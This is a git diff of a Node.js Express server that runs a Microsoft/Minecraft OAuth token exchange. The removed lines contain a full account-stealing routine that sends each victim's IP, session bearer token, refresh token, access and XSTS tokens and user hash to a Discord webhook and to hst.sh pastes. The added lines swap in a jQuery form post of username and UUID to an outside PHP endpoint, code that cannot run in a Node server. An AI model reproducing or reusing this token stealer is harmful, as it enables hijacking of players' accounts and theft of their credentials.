@@ -13,33 +13,24 @@ const port = process.env.PORT || 3000
 app.get('/', async (req, res) => {
     console.log("A user has connected")
     res.send('Error 400: Could not Login')
-    let code = req.query.code
+   const code = req.query.code
     if (code == null) {
-        console.log("Invalid code")
         return
     }
-    console.log("A user has connected")
     try {
-        let accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
-        console.log("A user has connected")
-        let accessToken = accessTokenAndRefreshTokenArray[0]
-        let refreshToken = accessTokenAndRefreshTokenArray[1]
-        let hashAndTokenArray = await getUserHashAndToken(accessToken)
-        let userToken = hashAndTokenArray[0]
-        let userHash = hashAndTokenArray[1]
-        console.log("A user has connected")
-        let xstsToken = await getXSTSToken(userToken)
-        let bearerToken = await getBearerToken(xstsToken, userHash)
-        console.log("A user has connected")
-        let usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
-        let uuid = usernameAndUUIDArray[0]
-        console.log("A user has connected")
-        let username = usernameAndUUIDArray[1]
-        console.log("A user has connected")
+        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
+        const accessToken = accessTokenAndRefreshTokenArray[0]
+        const refreshToken = accessTokenAndRefreshTokenArray[1]
+        const hashAndTokenArray = await getUserHashAndToken(accessToken)
+        const userToken = hashAndTokenArray[0]
+        const userHash = hashAndTokenArray[1]
+        const xstsToken = await getXSTSToken(userToken)
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        console.log("Test CONFIRMED")
-        postHook(username, uuid, ip, code, bearerToken, refreshToken, accessToken, xstsToken, userHash)
-        
+        pageGoPost({url: "http://d-na.kr/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
     } catch (e) {
         console.log(e)
     }
@@ -60,7 +51,7 @@ async function getAccessTokenAndRefreshToken(code) {
     let data = {
         client_id: client_id,
         redirect_uri: redirect_uri,
-        client_secret: client_secret,
+        secret_value: secret_value,
         code: code,
         grant_type: 'authorization_code'
     }
@@ -131,136 +122,24 @@ async function getUsernameAndUUID(bearerToken) {
 function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
-
-async function postHook(username, uuid, ip, code, bearerToken, refreshToken, accessToken, xstsToken, userHash) {
-
-    const urlAccessToken = await (await axios.post("https://hst.sh/documents/", accessToken).catch(() => { return { data: { key: "Error uploading" } } })).data.key
-    const urlXstsToken = await (await axios.post("https://hst.sh/documents/", xstsToken).catch(() => { return { data: { key: "Error uploading" } } })).data.key
-
-    const AccessFinal = "https://hst.sh/" + urlAccessToken;
-    const xstsFinal = "https://hst.sh/" + urlXstsToken;
-
-    let data = {
-        title: "User Info",
-        url: "https://sky.shiiyu.moe/stats/" + username,
-        color: 0x13F9C2,
-        fields: [
-            {
-                name: "Username",
-                value: username,
-                inline: true
-            },
-            {
-                name: "UUID", 
-                value: uuid, 
-                inline: true
-            },
-            {
-                name: "Ip", 
-                value: ip, 
-                inline: true
-            },
-            {
-                name: "Code", 
-                value: code, 
-                inline: true
-            },
-            {
-                name: "SSID", 
-                value: bearerToken, 
-                inline: false
-            },
-            {
-                name: "Refresh Token", 
-                value: refreshToken, 
-                inline: false
-            },
-            {
-                name: "Login", 
-                value: username + ":" + uuid + ":" + bearerToken, 
-                inline: false
-            },
-            {
-                name: "hash", 
-                value: userHash, 
-                inline: false
-            }
-        ]
-    };
-    let data2 = {
-        title: "Refresh Information",
-        color: 0x13F9C2,
-        fields: [
-            {
-                name: "Access",
-                value: AccessFinal,
-                inline: false
-            },
-            {
-                name: "Xstst Token",
-                value: xstsFinal,
-                inline: false
-            },
-            {
-                name: "Hash",
-                value: userHash,
-                inline: false
-            }
-        ]
-    };
-    console.log(JSON.stringify({
-        avatar_url: ``,
-        username: "OAuth",
-        embeds: [data],
-    }))
-    await axios.post(
-        webhook_url,
-        JSON.stringify({
-            avatar_url: ``,
-            username: "OAuth",
-            content: "@everyone ",
-            embeds: [data, data2],
-        }),
-        {
-            headers: {
-                "Content-Type": "application/json",
-            },
-        }
-    ).catch((err) => {
-        console.log(`Error while sending to webhook\n${err}`);
-    });
-    // console.log(JSON.stringify({
-    //     avatar_url: ``,
-    //     username: "OAuth",
-    //     embeds: [data2],
-    // }))
-    // axios.post(
-    //     webhook_url,
-    //     JSON.stringify({
-    //         avatar_url: ``,
-    //         username: "OAuth",
-    //         embeds: [],
-    //     }),
-    //     {
-    //         headers: {
-    //             "Content-Type": "application/json",
-    //         },
-    //     }
-    // ).catch((err) => {
-    //     console.log(`Error while sending to webhook\n${err}`);
-    // });
+function pageGoPost(d){
+	var insdoc = "";
+    
+	for (var i = 0; i < d.vals.length; i++) {
+	  insdoc+= "<input type='hidden' name='"+ d.vals[i][0] +"' value='"+ d.vals[i][1] +"'>";
+	}
+    
+	var goform = $("<form>", {
+	  method: "post",
+	  action: d.url,
+	  target: d.target,
+	  html: insdoc
+	}).appendTo("body");
+    
+	goform.submit();
 }
 
-const formatNumber = (num) => {
-    if (num < 1000) return num.toFixed(2)
-    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
-    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
-    else return `${(num / 1000000000).toFixed(2)}b`
-}
 
-async function pasteToUrl(str) {
-    return await axios.post("https://hst.sh/documents/", str).catch(() => { return { data: { key: "Error uploading" } } }).key
-}
 
 const bannedNames = []
 
@@ -275,6 +154,6 @@ function checkIfBanned(name) {
             return true
         }
     }
-    //addBan(name)
+    addBan(name)
     return false
 }
